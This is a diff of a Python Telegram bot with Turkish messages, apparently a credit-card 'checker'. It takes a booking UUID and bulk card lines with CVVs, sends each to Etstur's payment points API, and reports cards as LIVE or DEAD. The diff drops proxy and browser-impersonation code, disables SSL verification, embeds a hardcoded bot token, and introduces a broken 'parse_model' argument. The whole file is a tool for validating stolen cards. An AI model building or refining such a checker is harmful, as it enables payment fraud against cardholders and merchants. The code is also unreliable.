@@ -1,12 +1,12 @@
 # language: Python, file: bot.py, target: Linux, Python 3.10+
 import asyncio
+import aiohttp
 import logging
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-from curl_cffi.requests import AsyncSession
 
 API_TOKEN = "8836035013:AAHXLqHRwe9GIfV5dzvcrT1S2_RmAaHYb64"
 
@@ -16,10 +16,9 @@ dp = Dispatcher(storage=MemoryStorage())
 
 class CheckerState(StatesGroup):
     waiting_for_uuid = State()
-    waiting_for_proxy = State()
     waiting_for_cards = State()
 
-async def puan_sorgula(session, booking_uuid, proxy, kart_no, ay, yil):
+async def puan_sorgula(session, booking_uuid, kart_no, ay, yil):
     if len(yil) == 4:
         yil = yil[2:]
 
@@ -46,33 +45,29 @@ async def puan_sorgula(session, booking_uuid, proxy, kart_no, ay, yil):
     }
 
     try:
-        # curl_cffi ile tarayıcı taklidi yaparken proxy kullanıyoruz
-        response = await session.post(
+        async with session.post(
             "https://www.etstur.com/services/api/hotel/payment/get-credit-card-point",
-            headers=h, json=data, proxy=proxy, impersonate="chrome120", timeout=10
-        )
-        
-        if response.status_code == 403:
-            return "403_ERR", 0, "", "Cloudflare/403 Engeli"
-        if response.status_code != 200:
-            return "DEAD", 0, "", f"HTTP_{response.status_code}"
-        
-        result = response.json()
-        msg = str(result.get("errorMessage", "")).strip()
-        res = result.get("result") or {}
-        puan = res.get("pointAmount", 0)
-        success = res.get("success", False)
+            headers=h, json=data, timeout=aiohttp.ClientTimeout(total=10)
+        ) as r:
+            if r.status != 200:
+                return "DEAD", 0, "", f"HTTP_{r.status}"
+            
+            result = await r.json()
+            msg = str(result.get("errorMessage", "")).strip()
+            res = result.get("result") or {}
+            puan = res.get("pointAmount", 0)
+            success = res.get("success", False)
 
-        if success or puan > 0:
-            return "LIVE_PUAN", puan, res.get("currency", "TL"), msg
-        elif msg:
-            return "MSG_DEAD", 0, "", msg
-        else:
-            return "DEAD", 0, "", "Declined"
+            if success or puan > 0:
+                return "LIVE_PUAN", puan, res.get("currency", "TL"), msg
+            elif msg:
+                return "MSG_DEAD", 0, "", msg
+            else:
+                return "DEAD", 0, "", "Declined"
     except Exception as e:
         return f"HATA:{e}", 0, "", str(e)
 
-async def process_single(session, booking_uuid, proxy, satir):
+async def process_single(session, booking_uuid, satir):
     parca = satir.replace(";", "|").replace(",", "|").split("|")
     if len(parca) < 3:
         return f"❌ {satir} -> Format Hatalı"
@@ -84,12 +79,10 @@ async def process_single(session, booking_uuid, proxy, satir):
     if len(kart_no) != 16:
         return f"❌ {kart_no} -> Geçersiz Uzunluk"
 
-    durum, puan, para, mesaj = await puan_sorgula(session, booking_uuid, proxy, kart_no, ay, yil)
+    durum, puan, para, mesaj = await puan_sorgula(session, booking_uuid, kart_no, ay, yil)
 
     if durum == "LIVE_PUAN":
         return f"🟢 **LIVE** | `{kart_no}` | **{puan} {para}** | {mesaj}"
-    elif durum == "403_ERR":
-        return f"🚫 **403 ENGELİ** | `{kart_no}` | Proxy/IP Engeli"
     elif durum == "MSG_DEAD":
         return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
     elif durum == "DEAD":
@@ -100,7 +93,7 @@ async def process_single(session, booking_uuid, proxy, satir):
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
     await state.set_state(CheckerState.waiting_for_uuid)
-    await message.answer("🤖 **Etstur Puan Checker Bot**\n\nAdım 1/2: Lütfen kullanmak istediğiniz **Booking UUID** kodunu gönderin:")
+    await message.answer("🤖 **Etstur Puan Checker Bot**\n\nLütfen kullanmak istediğiniz **Booking UUID** kodunu gönderin:")
 
 @dp.message(CheckerState.waiting_for_uuid)
 async def handle_uuid(message: types.Message, state: FSMContext):
@@ -110,17 +103,8 @@ async def handle_uuid(message: types.Message, state: FSMContext):
         return
 
     await state.update_data(booking_uuid=uuid_input)
-    await state.set_state(CheckerState.waiting_for_proxy)
-    await message.answer("✅ **UUID Kaydedildi.**\n\nAdım 2/2: Kullanmak istediğiniz **Proxy adresini** gönderin (Örnek: `http://IP:PORT` veya proxy kullanmıyorsanız direkt `yok` yazın):")
-
-@dp.message(CheckerState.waiting_for_proxy)
-async def handle_proxy(message: types.Message, state: FSMContext):
-    proxy_input = message.text.strip()
-    proxy_val = None if proxy_input.lower() == "yok" else proxy_input
-
-    await state.update_data(proxy=proxy_val)
     await state.set_state(None)
-    await message.answer(f"✅ **Tüm Ayarlar Tamamlandı!**\nProxy: `{proxy_val if proxy_val else 'Kullanılmıyor'}`\n\nŞimdi kart sorgulamak için **/kontrol** komutunu yazın.")
+    await message.answer(f"✅ **Booking UUID Kaydedildi:** `{uuid_input}`\n\nŞimdi kart sorgulamak için **/kontrol** komutunu yazın.")
 
 @dp.message(Command("kontrol"))
 async def cmd_kontrol(message: types.Message, state: FSMContext):
@@ -129,17 +113,16 @@ async def cmd_kontrol(message: types.Message, state: FSMContext):
 
     if not booking_uuid:
         await state.set_state(CheckerState.waiting_for_uuid)
-        await message.answer("⚠️ Henüz Booking UUID girilmedi! Baştan başlamak için **/start** komutunu yazın:")
+        await message.answer("⚠️ Henüz Booking UUID girilmedi! Lütfen önce **Booking UUID** kodunu gönderin:")
         return
 
     await state.set_state(CheckerState.waiting_for_cards)
-    await message.answer(f"📝 Sorgulanacak kartları alt alta gönderin (Format: `KARTNO|AY|YIL|CVV`):")
+    await message.answer(f"📝 Aktif UUID: `{booking_uuid}`\nSorgulanacak kartları alt alta gönderin (Format: `KARTNO|AY|YIL|CVV`):")
 
 @dp.message(CheckerState.waiting_for_cards)
 async def handle_cards(message: types.Message, state: FSMContext):
     user_data = await state.get_data()
     booking_uuid = user_data.get("booking_uuid")
-    proxy = user_data.get("proxy")
 
     satirlar = [s.strip() for s in message.text.split("\n") if s.strip()]
     if not satirlar:
@@ -149,19 +132,20 @@ async def handle_cards(message: types.Message, state: FSMContext):
     status_msg = await message.answer(f"⏳ Toplam {len(satirlar)} kart taranıyor...")
     
     sem = asyncio.Semaphore(5)
+    connector = aiohttp.TCPConnector(limit=10, force_close=True, ssl=False)
     
-    async with AsyncSession() as session:
+    async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
         for satir in satirlar:
             async def bounded_task(s=satir):
                 async with sem:
-                    return await process_single(session, booking_uuid, proxy, s)
+                    return await process_single(session, booking_uuid, s)
             tasks.append(bounded_task())
 
         results = await asyncio.gather(*tasks)
 
     await state.clear()
-    await state.update_data(booking_uuid=booking_uuid, proxy=proxy)
+    await state.update_data(booking_uuid=booking_uuid)
     
     chunk = ""
     for res in results:
@@ -171,9 +155,9 @@ async def handle_cards(message: types.Message, state: FSMContext):
         chunk += res + "\n"
     
     if chunk:
-        await message.answer(chunk, parse_mode="Markdown")
+        await message.answer(chunk, parse_model="Markdown")
     
-    await message.answer("✅ **Tarama Tamamlandı!**\nYeni kartlar için tekrar **/kontrol** yazabilir veya UUID/Proxy değiştirmek için yeniden **/start** yapabilirsiniz.")
+    await message.answer("✅ **Tarama Tamamlandı!**\nYeni kartlar için tekrar **/kontrol** yazabilir veya farklı UUID ayarlamak için **/start** yapabilirsiniz.")
 
 async def main():
     await dp.start_polling(bot)
